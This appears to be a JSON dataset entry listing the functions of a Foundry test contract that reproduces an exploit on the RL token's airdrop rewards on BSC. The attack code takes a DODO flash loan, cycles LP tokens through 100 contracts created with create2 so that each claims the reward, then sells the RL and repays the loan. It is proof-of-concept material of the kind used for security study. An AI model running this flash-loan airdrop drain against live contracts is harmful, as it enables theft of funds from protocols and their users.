[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "DPPFlashLoanCall",
    "original_code": "    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        buyRLAndAddLiquidity();\n        //claimAirDrop\n        for (uint256 i = 0; i < contractAddress.length; i++) {\n            Pair.transfer(contractAddress[i], Pair.balanceOf(address(this)));\n            (bool success,) = contractAddress[i].call(abi.encodeWithSignature(\"airDropReward(address)\", address(this)));\n            require(success);\n        }\n\n        removeLiquidityAndSellRL();\n        USDT.transfer(msg.sender, 450_000 * 1e18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "airDropContractFactory",
    "original_code": "    function airDropContractFactory() public {\n        address _add;\n        bytes memory bytecode = type(AirDropRewardContract).creationCode;\n        for (uint256 _salt = 0; _salt < 100; _salt++) {\n            assembly {\n                _add := create2(0, add(bytecode, 32), mload(bytecode), _salt)\n            }\n            contractAddress.push(_add);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "buyRLAndAddLiquidity",
    "original_code": "    function buyRLAndAddLiquidity() public {\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(RL);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            150_000 * 1e18, 0, path, address(this), block.timestamp\n        );\n\n        Router.addLiquidity(\n            address(USDT),\n            address(RL),\n            USDT.balanceOf(address(this)),\n            RL.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "contractAddress",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "removeLiquidityAndSellRL",
    "original_code": "    function removeLiquidityAndSellRL() public {\n        Router.removeLiquidity(\n            address(USDT), address(RL), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n\n        address[] memory path = new address[](2);\n        path[0] = address(RL);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            RL.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 21_794_289);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        emit log_named_decimal_uint(\"[Start] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n\n        USDT.approve(address(Router), ~uint256(0));\n        RL.approve(address(Router), ~uint256(0));\n        Pair.approve(address(Router), ~uint256(0));\n        airDropContractFactory();\n        //change timestamp to pass check\n        cheats.warp(block.timestamp + 24 * 60 * 60);\n        dodo.flashLoan(0, 450_000 * 1e18, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  }
]